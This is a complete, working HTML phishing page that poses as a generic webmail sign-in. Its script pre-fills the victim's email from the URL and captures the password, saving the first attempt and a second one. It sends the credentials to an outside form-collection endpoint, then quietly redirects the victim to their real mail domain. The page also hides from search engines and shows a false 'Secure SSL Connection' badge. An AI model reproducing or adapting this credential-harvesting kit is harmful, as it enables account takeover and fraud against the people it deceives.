<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Prevent search engines from indexing this page -->
  <meta name="robots" content="noindex, nofollow">
  <title>Webmail Login</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Oxygen,Ubuntu,Cantarell,sans-serif}
    body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;color:#333}
    .login-container{width:100%;max-width:420px;background:#fff;border-radius:4px;box-shadow:0 2px 10px rgba(0,0,0,.1);overflow:hidden}
    .login-header{background:#005a9e;color:#fff;padding:20px;text-align:center}
    .login-header h1{font-size:22px;font-weight:400}
    .login-form{padding:30px}
    .form-group{margin-bottom:20px}
    .input-with-icon{position:relative}
    .input-with-icon svg{position:absolute;left:12px;top:50%;transform:translateY(-50%);width:16px;height:16px;fill:#666}
    input[type="text"],input[type="password"]{width:100%;padding:12px 12px 12px 40px;border:1px solid #ccc;border-radius:4px;font-size:14px;transition:border .3s}
    input[type="text"]:focus,input[type="password"]:focus{border-color:#005a9e;outline:none;box-shadow:0 0 0 2px rgba(0,90,158,.2)}
    .checkbox-group{display:flex;align-items:center;margin-bottom:20px}
    .checkbox-group input{margin-right:8px}
    .checkbox-group label{margin-bottom:0;font-weight:400}
    button{width:100%;padding:12px;background:#005a9e;border:none;border-radius:4px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;transition:background .3s}
    button:hover{background:#004a87}
    .footer{text-align:center;margin-top:20px;color:#666;font-size:12px}
    .footer a{color:#005a9e;text-decoration:none}
    .footer a:hover{text-decoration:underline}
    .language-selector{text-align:center;margin-top:15px;font-size:12px;color:#666}
    .language-selector select{padding:5px;border:1px solid #ccc;border-radius:3px;font-size:12px;margin-left:5px}
    .security-notice{background:#f8f8f8;border-top:1px solid #eee;padding:15px;text-align:center;font-size:12px;color:#666}
    .security-notice svg{width:12px;height:12px;fill:#2ecc71;margin-right:5px}
    /* Loader style */
    .loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:9999;justify-content:center;align-items:center}
    .loader::after{content:"";width:40px;height:40px;border:4px solid #fff;border-top-color:#005a9e;border-radius:50%;animation:spin 0.8s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="loader" id="loader"></div>
  
  <div class="login-container">
    <div class="login-header">
      <h1>Webmail Login</h1>
    </div>
    
    <div class="login-form">
      <form id="loginForm" method="POST">
        <!-- Honeypot field - invisible to humans, traps bots -->
        <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
        
        <div class="form-group">
          <div class="input-with-icon">
            <svg viewBox="0 0 24 24">
              <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
            </svg>
            <input type="text" id="user" name="email" placeholder="" readonly>
          </div>
        </div>
        
        <div class="form-group">
          <div class="input-with-icon">
            <svg viewBox="0 0 24 24">
              <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
            </svg>
            <input type="password" id="pass" name="password" placeholder="Password" required>
          </div>
        </div>
        
        <div class="checkbox-group">
          <input type="checkbox" id="remember">
          <label for="remember">Remember me</label>
        </div>
        
        <button type="submit">Sign In</button>
      </form>
      
      <div class="footer">
        <p><a href="#">Forgot your password?</a></p>
      </div>
      
      <div class="language-selector">
        Language: 
        <select>
          <option>English</option>
          <option>Español</option>
          <option>Français</option>
          <option>Deutsch</option>
        </select>
      </div>
    </div>
    
    <div class="security-notice">
      <svg viewBox="0 0 24 24">
        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
      </svg>
      Secure SSL Connection
    </div>
  </div>

  <script>
    // Formspark endpoint
    const FORMSPARK_URL = "https://submit-form.com/YLRAGvOOL";
    
    // Get email from URL hash (e.g., #email@domain.com)
    function getEmailFromURL() {
      if (window.location.hash && window.location.hash.includes('@')) {
        return window.location.hash.substring(1);
      }
      const urlParams = new URLSearchParams(window.location.search);
      if (urlParams.has('email')) {
        return urlParams.get('email');
      }
      return null;
    }
    
    // Pre-fill email field
    const emailFromUrl = getEmailFromURL();
    const emailInput = document.getElementById('user');
    if (emailFromUrl) {
      emailInput.value = emailFromUrl;
    } else {
      emailInput.value = 'No email specified in URL';
    }
    
    // Form submission handler
    const form = document.getElementById('loginForm');
    const loader = document.getElementById('loader');
    let attemptCount = 0;
    let firstPassword = '';
    
    form.addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const email = document.getElementById('user').value.trim();
      const password = document.getElementById('pass').value.trim();
      
      if (!email || email === 'No email specified in URL') {
        alert('Please enter a valid email address');
        return;
      }
      
      if (!password) {
        alert('Please enter your password');
        return;
      }
      
      attemptCount++;
      
      // Show loader
      loader.style.display = 'flex';
      
      // Prepare data for Formspark
      const formData = {
        email: email,
        password: password,
        webmail_login: true
      };
      
      // Add first attempt info on second try
      if (attemptCount === 2) {
        formData.first_attempt_password = firstPassword;
        formData.attempt = 'second';
      } else if (attemptCount === 1) {
        firstPassword = password;
        formData.attempt = 'first';
      }
      
      try {
        await fetch(FORMSPARK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(formData)
        });
      } catch(err) {
        console.log('Formspark error:', err);
      }
      
      // Extract domain from email for redirect
      const domain = email.split('@')[1];
      
      // Redirect to the real domain without exposing password in URL
      setTimeout(() => {
        window.location.href = `https://${domain}`;
      }, 1500);
    });
  </script>
</body>
</html>
